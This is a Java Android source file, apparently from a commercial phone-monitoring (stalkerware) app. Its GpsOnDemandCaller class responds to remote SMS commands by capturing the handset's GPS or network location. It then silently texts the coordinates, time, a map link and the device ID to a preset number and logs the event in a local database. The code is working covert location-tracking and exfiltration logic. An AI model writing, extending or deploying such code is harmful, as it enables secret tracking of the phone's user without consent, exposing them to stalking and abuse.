package com.fx.dalvik.smscommand;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.TimeZone;

import android.content.Context;
import android.location.Location;
import android.telephony.SmsManager;

import com.fx.event.EventLocation;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.maind.ref.Customization;
import com.fx.util.FxResource;
import com.vvt.calendar.CalendarObserver;
import com.vvt.location.GpsOnDemand;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.PhoneInfoHelper;

public class GpsOnDemandCaller implements GpsOnDemand.OnCaptureListener {
	
	private static final String TAG = "GpsOnDemandCaller";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static final String PROVIDER_GPS = "gps";
	private static final String PROVIDER_NETWORK = "network";
	private static final String PROVIDER_GLOCATION = "glocation";
	
	private boolean mIsNotificationSmsSent;
	
	private Context mContext;
	private GpsOnDemand mGpsOnDemand;
	
	private CalendarObserver mCalendarObserver;
	private SimpleDateFormat mDateFormatter;
	
	private String mDestinationNumber;
	private String mResponseHeader;
	
	public GpsOnDemandCaller(Context context) {
		mIsNotificationSmsSent = false;
		
		mContext = context;
		mGpsOnDemand = GpsOnDemand.getInstance(mContext);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void setDestinationNumber(String number) {
		mDestinationNumber = number;
	}
	
	public void setResponseHeader(String responseHeader) {
		mResponseHeader = responseHeader;
	}
	
	public void enable() {
		mGpsOnDemand.enable(this);
	}
	
	public void disable() {
		mGpsOnDemand.disable();
	}
	
	@Override
	public void onProviderCapture(Location location) {
		captureLocation(location);
	}

	@Override
	public void onGoogleServiceCapture(Location location) {
		captureLocation(location);
	}

	@Override
	public void onUnableToCapture() {
		FxLog.d(TAG, String.format("onUnableToCapture # %s", 
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED));
				
		sendSms(String.format("%s%s\n%s", mResponseHeader, 
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED));
	}

	@Override
	public void onRetryAfterTimeout() {
		FxLog.d(TAG, String.format("onRetryAfterTimeout # %s", 
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_IS_RETRYING));
		
		if (! mIsNotificationSmsSent) {
			mIsNotificationSmsSent = true;
			sendSms(String.format("%s%s\n%s", mResponseHeader, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_IS_RETRYING));
		}
	}
	
	private void captureLocation(Location location) {
		mDateFormatter.setTimeZone(TimeZone.getTimeZone(mCalendarObserver.getLocalTimeZone()));
		String time = mDateFormatter.format(new Date(location.getTime()));
		
		EventLocation event = new EventLocation(mContext, time, 
				location.getLatitude(), location.getLongitude(), location.getAltitude(), 
				(double) location.getAccuracy(), 0.0, location.getProvider());
		
		FxLog.d(TAG, String.format("captureLocation # %s", event.getShortDescription()));
		
		String methodText = 
			FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_UNKNOWN;
		
		if (PROVIDER_GPS.equalsIgnoreCase(location.getProvider())) {
			methodText = FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GPS;
		}
		else if (PROVIDER_NETWORK.equalsIgnoreCase(location.getProvider())) {
			methodText = FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_NETWORK;
		}
		else if (PROVIDER_GLOCATION.equalsIgnoreCase(location.getProvider())) {
			methodText = FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GLOCATION;
		}
		
		String mapUrl = getWebLink(location);
		
		String info = String.format("%s:\nLAT: %f\nLONG: %f\nDATE: %s\n%s", 
				methodText, event.getLatitude(), event.getLongitude(), 
				event.getTime(), mapUrl);
		
		
		sendSms(String.format("%s%s\n%s", mResponseHeader,
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, info));
		
		EventDatabaseManager.getInstance(mContext).insert(event);
	}

	private void sendSms(String message) {
		if (LOGV) {
			FxLog.v(TAG, String.format("sendSms # message: %s", message));
		}
		if (mDestinationNumber != null) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendMultipartTextMessage(
					mDestinationNumber, null, smsManager.divideMessage(message), null, null);
			
			// Don't capture a system event here, it'll be duplicated
		}
	}
	
	private String getWebLink(Location location) {
		GregorianCalendar calendar = new GregorianCalendar();
		calendar.setTimeInMillis(location.getTime());
		
		String year = String.valueOf(calendar.get(Calendar.YEAR));
		
		String month = String.valueOf(calendar.get(Calendar.MONTH) + 1);
		if (month.length() < 2) month = String.format("0%s", month);
		
		String date = String.valueOf(calendar.get(Calendar.DATE));
		if (date.length() < 2) date = String.format("0%s", date);
		
		String hour = String.valueOf(calendar.get(Calendar.HOUR));
		if (hour.length() < 2) hour = String.format("0%s", hour);
		
		String min = String.valueOf(calendar.get(Calendar.MINUTE));
		if (min.length() < 2) min = String.format("0%s", min);
		
		String timeParam = String.format("%s%s%s%s%s", year, month, date, hour, min);
		
		return String.format(
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WEB_SERVICE_FORM, 
				location.getLatitude(), location.getLongitude(), timeParam, 
				PhoneInfoHelper.getInstance(mContext).getDeviceId());
	}

}
